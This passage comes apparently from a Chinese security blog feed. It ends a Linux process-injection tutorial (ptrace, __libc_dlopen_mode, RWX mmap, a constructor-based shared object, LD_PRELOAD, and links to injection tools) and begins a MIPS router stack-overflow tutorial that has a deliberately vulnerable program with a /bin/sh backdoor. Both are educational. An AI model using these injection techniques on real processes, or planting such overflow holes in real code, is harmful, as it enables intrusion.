class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">99</span>-pre6)<br><span class="hljs-attribute">PTRACE_SETSIGINFO</span> (since Linux <span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">99</span>-pre6)<br><span class="hljs-attribute">PTRACE_PEEKSIGINFO</span> (since Linux <span class="hljs-number">3</span>.<span class="hljs-number">10</span>)<br><span class="hljs-attribute">PTRACE_GETSIGMASK</span> (since Linux <span class="hljs-number">3</span>.<span class="hljs-number">11</span>)<br><span class="hljs-attribute">PTRACE_SETSIGMASK</span> (since Linux <span class="hljs-number">3</span>.<span class="hljs-number">11</span>)<br><span class="hljs-attribute">PTRACE_CONT</span><br><span class="hljs-attribute">PTRACE_SYSCALL</span>,<br><span class="hljs-attribute">PTRACE_SINGLESTEP</span><br><span class="hljs-attribute">PTRACE_DETACH</span><br><span class="hljs-attribute">etc</span>.<br></code></pre></td></tr></table></figure><p>更详细的内容可以在<a href="http://man7.org/linux/man-pages/man2/ptrace.2.html">这里</a><br>或者<a href="https://linux.die.net/man/2/ptrace">这里</a> 查询</p><p>当然我们也可以直接打开我们的terminal,然后 man ptrace</p><p>这里我们只举例几个我们会用到的几个参数</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">PTRACE_ATTACH<span class="hljs-punctuation">,</span>PTRACE_TRACEME  <span class="hljs-comment">//关联到进程</span><br>PTRACE_CONT <span class="hljs-comment">//让子程序继续运行</span><br>PTRACE_PEEKTEXT<span class="hljs-punctuation">,</span> PTRACE_PEEKDATA<span class="hljs-punctuation">,</span> PTRACE_PEEKUSR <span class="hljs-comment">//读取指定进程的内存</span><br>PTRACE_POKETEXT<span class="hljs-punctuation">,</span>PTRACE_POKEDATA<span class="hljs-punctuation">,</span> PTRACE_POKEUSR <span class="hljs-comment">//写进指定进程的内存</span><br>PTRACE_GETREGS <span class="hljs-comment">//读取寄存器详细信息</span><br>PTRACE_SETREGS <span class="hljs-comment">//设置当前进程的一组处理器寄存器值</span><br>PTRACE_DETACH<span class="hljs-punctuation">,</span> PTRACE_KILL   <span class="hljs-comment">//脱离进程</span><br></code></pre></td></tr></table></figure><p>那么我们现在暂时拥有了内存的读写权限,现在就该向我们的进程中注入代码了</p><h4 id="获得libc-dlopen-mode函数地址"><a href="#获得libc-dlopen-mode函数地址" class="headerlink" title="获得libc_dlopen_mode函数地址"></a>获得libc_dlopen_mode函数地址</h4><p>首先我们需要了解两个个函数,dlopen()和dlsym(),函数定义如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> * <span class="hljs-title">dlopen</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> * pathname, <span class="hljs-type">int</span> mode)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">dlsym</span><span class="hljs-params">(<span class="hljs-type">void</span>* handler, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* symbol)</span></span>;<br></code></pre></td></tr></table></figure><p>这个函数的作用就是打开一个动态链接库,并且返回动态链接库的句柄</p><p>mode参数是so文件的打开方式我们这里只用到RTLD_LAZY,即在dlopen返回前，对于动态库中的未定义的符号不执行解析,也就是延迟绑定,关于其他的参数各位师傅感兴趣的话可以自行了解</p><p>而通过dlsym()函数我们可以从句柄中取出我们所需要用的函数来调用</p><p>那么即然我们已经获取了进程内存的读写权限,那么我们现在就直接开始调用dlopen函数搞事吧:)</p><p>这里要提及一句,dlopen并不是每一个进程都有的,但是_libc_dlopen_mode是默认包含的,所以在dlopen不能使用的时候,我们可以选择调用_libc_dlopen_mode</p><p>该函数定义如下:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">void</span> * __libc_dlopen_mode (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">int</span> mode)<br></code></pre></td></tr></table></figure><p>为便于通用性,这里我们就拿_libc_dlopen_mode作为实例来进行进程注入</p><p>那么现在我们确定了需要使用的函数,下一步要做的就是确定该函数在进程中的内存地址,这里有两种方法,这里都介绍一下</p><ol><li><p>cat &#x2F;proc&#x2F;$pid&#x2F;maps 得到基址之后根据偏移来得到</p></li><li><p>用类似于pwn中常用的ret2dl-resolve技巧来寻找</p></li></ol><p>我们再来看一下elf是如何通过重定位来找到函数地址的,<br>这里贴一段来自一个师傅对最核心的代码和分析(具体来源有点找不到了)</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs rust">_dl_fixup(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *l, <span class="hljs-title function_ invoke__">ElfW</span>(Word) reloc_arg)<br>&#123;<br>    <span class="hljs-comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span><br>    <span class="hljs-keyword">const</span> PLTREL *<span class="hljs-keyword">const</span> reloc = (<span class="hljs-keyword">const</span> void *) (<span class="hljs-title function_ invoke__">D_PTR</span> (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_ invoke__">ElfW</span>(Sym) *sym = &amp;symtab[<span class="hljs-title function_ invoke__">ELFW</span>(R_SYM) (reloc<span class="hljs-punctuation">-&gt;</span>r_info)];<br>    <span class="hljs-comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span><br>    <span class="hljs-title function_ invoke__">assert</span> (<span class="hljs-title function_ invoke__">ELFW</span>(R_TYPE)(reloc<span class="hljs-punctuation">-&gt;</span>r_info) == ELF_MACHINE_JMP_SLOT);<br>    <span class="hljs-comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>    result = _dl_lookup_symbol_x (strtab + sym<span class="hljs-punctuation">-&gt;</span>st_name, l, &amp;sym, l<span class="hljs-punctuation">-&gt;</span>l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);<br>    <span class="hljs-comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br>    value = <span class="hljs-title function_ invoke__">DL_FIXUP_MAKE_VALUE</span> (result, sym ? (<span class="hljs-title function_ invoke__">LOOKUP_VALUE_ADDRESS</span> (result) + sym<span class="hljs-punctuation">-&gt;</span>st_value) : <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">elf_machine_fixup_plt</span> (l, result, reloc, rel_addr, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>具体实现过程师傅们可以看一下我之前的<a href="https://nightrainy.github.io/2019/07/17/ret2-dl-runtime-resolve/">关于ret2dl的文章</a>或者其他师傅的一些文章</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//bbs.pediy.com/thread-227034.htm</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//xz.aliyun.com/t/6471</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//xz.aliyun.com/t/4473</span><br></code></pre></td></tr></table></figure><p>当然,此处安利&lt;&lt;程序员的自我修养—链接、装载与库&gt;&gt;</p><p>那么现在我们就可以通过类似的方法来获取__libc_dlopen_mode的地址啦</p><p>因为不是pwn题,所以我们需要做的并不是那么麻烦,在可以获得进程的内存读写权限的时候,我们只需要遍历一下link_map和相关链表就可以完成_libc_dlopen_mode的符号解析从而获取地址</p><p>此时我们需要的就是调用了</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>那么我们该如何调用函数呢?<br>如果直接修改eip指针有可能会导致程序崩坏,因此我们在这里可以寻找一片nop内存进行注入,</p><p>我们可以选择调用mmap函数来将我们的文件写入到进程中,之后通过干扰重定位或者注入eip指针来调用我们所需要的函数,这里看一下mmap函数的定义:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span></span>;<br></code></pre></td></tr></table></figure><p>其他的参数想必大家都很熟悉,因此这里我只列出prot的一些参数选择</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">PROT_EXEC <span class="hljs-comment">//页内容可以被执行</span><br>PROT_READ <span class="hljs-comment">//页内容可以被读取</span><br>PROT_WRITE <span class="hljs-comment">//页可以被写入</span><br>PROT_NONE <span class="hljs-comment">//页不可访问</span><br></code></pre></td></tr></table></figure><p>而这个是可以通过or符号来组合选择的</p><p>比如 “PROT_READ | PROT_EXEC | PROT_WRITE”,可以    弄出一块可读可写可执行的区域,之后完成我们所需要做的操作即可</p><p>比如调用某个函数,或者替换某个函数</p><p>但是如果没有特殊需求(比如某某触发条件时),只需要执行我们想要执行的程序时,更简单的方法是通过共享对象构造函数来完成,也就是</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">__attribute __（（<span class="hljs-function"><span class="hljs-keyword">constructor</span>））装饰器</span><br></code></pre></td></tr></table></figure><p>在c++中,对于一个类我们可以通过编写构造函数来完成类中某些元素的初始化,在写好构造函数后,我们所创建的每一个对象都会自动调用构造函数来做一些初始化的操作,而共享对象构造函数也十分类似<br>共享库可以在加载时自动调用__attribute __（（constructor））装饰器来加载我们所写的代码,如:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-comment">//库文件:myso.so</span><br>#include &lt;stdio.h&gt;<br>#include &lt;system&gt;<br>void __attribute__((<span class="hljs-function"><span class="hljs-keyword">constructor</span>)) <span class="hljs-title">test</span><span class="hljs-params">(void)</span> <span class="hljs-comment">&#123;</span></span><br><span class="hljs-comment"><span class="hljs-function">    system(&quot;date&quot;);</span></span><br><span class="hljs-comment"><span class="hljs-function">&#125;</span></span><br><span class="hljs-function">/* <span class="hljs-title">gcc</span> -<span class="hljs-title">fPIC</span> -<span class="hljs-title">shared</span> <span class="hljs-title">myso</span>.<span class="hljs-title">c</span> -<span class="hljs-title">c</span> -<span class="hljs-title">o</span> <span class="hljs-title">myso</span>.<span class="hljs-title">o</span></span><br><span class="hljs-function">   <span class="hljs-title">ld</span> -<span class="hljs-title">shared</span> -<span class="hljs-title">ldl</span> <span class="hljs-title">myso</span>.<span class="hljs-title">o</span> -<span class="hljs-title">o</span> <span class="hljs-title">myso</span>.<span class="hljs-title">so</span> */</span><br></code></pre></td></tr></table></figure><p>so文件的构造函数效果是输出时间,那么便于观看效果,我们写一个程序来检测效果(因为注入的线程会中断原本的程序流畅,因此建议另起一个线程来调用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//测试文件 :test.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-built_in">dlopen</span>(<span class="hljs-string">&quot;./myso.so&quot;</span>, RTLD_LAZY);<br>&#125;<br><span class="hljs-comment">// gcc test.c -o test -ldl</span><br><br></code></pre></td></tr></table></figure><p>然后运行一下,运行结果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"> ~/inject/attribute  ./test <br>Tue Nov 19 07:41:11 PST 2019<br></code></pre></td></tr></table></figure><p>成功:)</p><p>这时如果有人测试<br>LD_PRELOAD&#x3D;.&#x2F;myso.so .&#x2F;test<br>的话,那么恭喜你,效果十分显著,具体效果师傅们可以自己试试(手动滑稽  </p><p>另起线程的示例代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//myso.so pthread版</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">void</span>* a)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;date&quot;</span>);<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> __attribute__((constructor)) <span class="hljs-built_in">pthread_test</span>(<span class="hljs-type">void</span>) &#123;<br>    <span class="hljs-type">pthread_t</span> my_pthread;<br>    <span class="hljs-built_in">pthread_create</span>(&amp;my_pthread, <span class="hljs-literal">NULL</span>, test, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-comment">/* gcc -fPIC -shared myso.c -c -o myso.o</span><br><span class="hljs-comment">   ld -shared -ldl -lpthread myso.o -o myso.so */</span><br></code></pre></td></tr></table></figure><p>而如果想替换函数,这有一篇文章讲的很好,虽然有些老了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">6388</span>.html<br></code></pre></td></tr></table></figure><p>最后的最后,向大家推荐几款比较好用的进程注入工具:</p><p><a href="https://github.com/gaffe23/linux-inject/">linux-inject</a><br>, <a href="https://github.com/kevien/saruman">saruman</a><br>, <a href="https://github.com/Screetsec/Vegile/blob/master/Vegile#L112">vegule</a><br>, <a href="https://github.com/mempodippy/cub3">cub3</a><br>, <a href="https://github.com/mempodippy/vlany">vlany</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>路由器漏洞利用之栈溢出</title>
    <link href="/2019/11/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2019/11/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>缓冲区溢出漏洞是很常见的漏洞，广泛存在于各个软件中，相信在学习pwn的过程中，大多数pwn师傅第一个学会的就是栈溢出的利用了，本文将介绍如何在MIPS32架构中利用栈溢出漏洞</p></blockquote><h1 id="MIPS汇编的一些小知识"><a href="#MIPS汇编的一些小知识" class="headerlink" title="MIPS汇编的一些小知识"></a>MIPS汇编的一些小知识</h1><p>因为不是本文讨论重点,这里仅做简单描述</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>1.通用寄存器</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">zero</span> -&gt;</span> 值始终为<span class="hljs-number">0</span><br>$<span class="hljs-function"><span class="hljs-title">at</span> -&gt;</span> 保留寄存器<br>$<span class="hljs-function"><span class="hljs-title">v0</span>-$v1 -&gt;</span> 保存表达式或者程序返回结果<br>$<span class="hljs-function"><span class="hljs-title">a0</span>-$v3 -&gt;</span> 函数调用的前四个参数<br>$<span class="hljs-function"><span class="hljs-title">t0</span>-t7 -&gt;</span> 临时寄存器<br>$<span class="hljs-function"><span class="hljs-title">s0</span>-$s7 -&gt;</span> 保存函数调用期间必须保存的原值<br>$<span class="hljs-function"><span class="hljs-title">t8</span>-$t9 -&gt;</span> 临时寄存器,拓展t0-t7<br>$<span class="hljs-function"><span class="hljs-title">k0</span>-$k1 -&gt;</span> 保留,中断处理函数使用<br>$<span class="hljs-function"><span class="hljs-title">gp</span> -&gt;</span> 全局指针<br>$<span class="hljs-function"><span class="hljs-title">sp</span> -&gt;</span> 栈顶指针<br>$<span class="hljs-function"><span class="hljs-title">fp</span> -&gt;</span> 保存栈指针<br>$<span class="hljs-function"><span class="hljs-title">ra</span> -&gt;</span> 保存返回地址<br></code></pre></td></tr></table></figure><ol start="2"><li>特殊寄存器</li></ol><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">PC -&gt; 程序计数器<br>HI -&gt; 乘除结果高位寄存器<br>LO -&gt; 乘除结果低位寄存器<br></code></pre></td></tr></table></figure><h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><ol><li>LOAD&#x2F;STORE指令</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">lb</span>,lbu,<span class="hljs-keyword">lh</span>,lhu,<span class="hljs-keyword">ll</span>,<span class="hljs-keyword">lw</span>,lwl,lwr,<span class="hljs-keyword">sb</span>,sc,<span class="hljs-keyword">sh</span>,<span class="hljs-keyword">sw</span>,swl,swr,<span class="hljs-keyword">move</span><br></code></pre></td></tr></table></figure><p>其中以l开头为加载,s开头为存储,其中move指令用于寄存器之间的值传递</p><ol start="2"><li>算术运算指令</li></ol><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">add</span>,addi,addiu,addiu,<span class="hljs-keyword">sub</span>,subu,clo,<span class="hljs-keyword">clz</span>,slt,slti,sltiu,sltu,<span class="hljs-keyword">mul</span>,mult,multu,madd,msub,msubu,div,divu<br></code></pre></td></tr></table></figure><p>3.类比较指令</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">slt,</span>slti,sltiu,sltu<br></code></pre></td></tr></table></figure><ol start="4"><li>SYSCALL</li></ol><p>依旧是软中断,用于执行系统调用</p><h1 id="MIPS堆栈原理"><a href="#MIPS堆栈原理" class="headerlink" title="MIPS堆栈原理"></a>MIPS堆栈原理</h1><p>在平常的linux pwn中我们遇到的系统架构多为x86体系，但在路由器的嵌入式系统中，很大一部分都是MIPS指令系统，而这两个系统在很多方面都有差异，这里主介绍我们利用漏洞所需要注意几个方面</p><ol><li><p>MIPS32架构中是没有EBP寄存器的，他在进入函数时是将当前栈指针向下移动n比特到该函数的stack frame存储空间，函数返回时再加上偏移量恢复栈指针</p></li><li><p>因为第一点的原因，寄存器出入栈时都需要指定偏移量</p></li><li><p>传参过程中，前四个参数$a0-$a3，多余的会保存在调用函数的预留的栈顶空间内</p></li><li><p>MIPS调用函数时会把函数的返回地址直接存入$RA寄存器</p></li></ol><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>在MIPS32架构中，函数被分为两种即叶子函数和非叶子函数。所谓叶子函数就是在该函数中不再调用其他函数的函数，反之，有其他函数调用的即是非叶子函数</p><p>举个栗子</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">A</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> *a,<span class="hljs-built_in">int</span> *b</span>)</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">tmp</span>(<span class="hljs-params"><span class="hljs-number">0</span></span>)</span>;<br>    tmp=a;<br>    a=b;<br>    b=tmp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">B</span>()</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-number">0</span></span>),<span class="hljs-title">b</span>(<span class="hljs-params"><span class="hljs-number">13</span></span>)</span>;<br>    A(a,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的A就是叶子函数，B为非叶子函数，而这两种函数在调用时也有很大区别:</p><p>拿上面的B来说好了，B函数在执行到第二行时即调用A函数时，先复制$PC寄存器的值到$RA,然后跳转到A函数，因为A是叶子函数，所以返回B的地址依然在$RA中，但如果是非叶子函数，呢么会将返回B的地址存在堆栈中<br>而在函数返回的时候，因为A是叶子函数，因此就直接用”jr $ra”返回B，否则先从堆栈中取出返回值，存到$ra中，后面的步骤就和叶子函数相同了</p><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>我们知道函数被分为了叶子函数和非叶子函数，他们的函数调用过程也不尽相同，因此在分析溢出时也要分为叶子函数和非叶子函数了分析</p><h2 id="非叶子函数"><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h2><p>从函数调用过程中我们知道在调用非叶子函数时，会把返回地址存入堆栈，因此我们拿一个简单的例子来说</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">backdoor</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vlun</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> dst[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,&amp;dst,<span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vlun</span>();<br>    <span class="hljs-built_in">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译一下:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">mips-linux-gcc no_leaf.c -<span class="hljs-keyword">static</span> -o no_leaf<br></code></pre></td></tr></table></figure><p>这里我们反编译一下程序</p><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">                     **************************************************************<br>                     *                          FUNCTION                          *<br>                     **************************************************************<br>                     undefined main()<br>     undefined         <span class="hljs-built_in">v0</span>:<span class="hljs-number">1</span>           &lt;RETURN&gt;<br>     undefined4        Stack[-<span class="hljs-number">0x4</span>]:<span class="hljs-number">4</span>  local_4                                 XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00400438</span>(W)  <br>     undefined4        Stack[-<span class="hljs-number">0x8</span>]:<span class="hljs-number">4</span>  local_8                                 XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">0040043</span>c(W)  <br>                     main                                            XREF[<span class="hljs-number">3</span>]:     Entry Point(*), <br><span class="hljs-symbol">                                                                                  __start:</span><span class="hljs-number">00400188</span>(*), <span class="hljs-number">0041</span>f200(*)  <br><span class="hljs-number">00400434</span> e0 ff <span class="hljs-keyword">bd </span><span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,-<span class="hljs-number">0x20</span><br><span class="hljs-number">00400438</span> <span class="hljs-number">1</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">bf </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">ra</span>,local_4(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">0040043</span>c <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">be </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s8</span>,local_8(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00400440</span> <span class="hljs-number">25</span> f0 <span class="hljs-built_in">a0</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">or </span>        <span class="hljs-built_in">s8</span>,<span class="hljs-built_in">sp</span>,<span class="hljs-built_in">zero</span><br><span class="hljs-number">00400444</span> f1 <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">0</span>c     <span class="hljs-keyword">jal </span>       vlun                                             undefined vlun()<br><span class="hljs-number">00400448</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">0040044</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00400450</span> <span class="hljs-number">25</span> e8 c0 <span class="hljs-number">03</span>     <span class="hljs-keyword">or </span>        <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">s8</span>,<span class="hljs-built_in">zero</span><br><span class="hljs-number">00400454</span> <span class="hljs-number">1</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">bf </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">ra</span>,<span class="hljs-number">0x1c</span>(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00400458</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">be </span><span 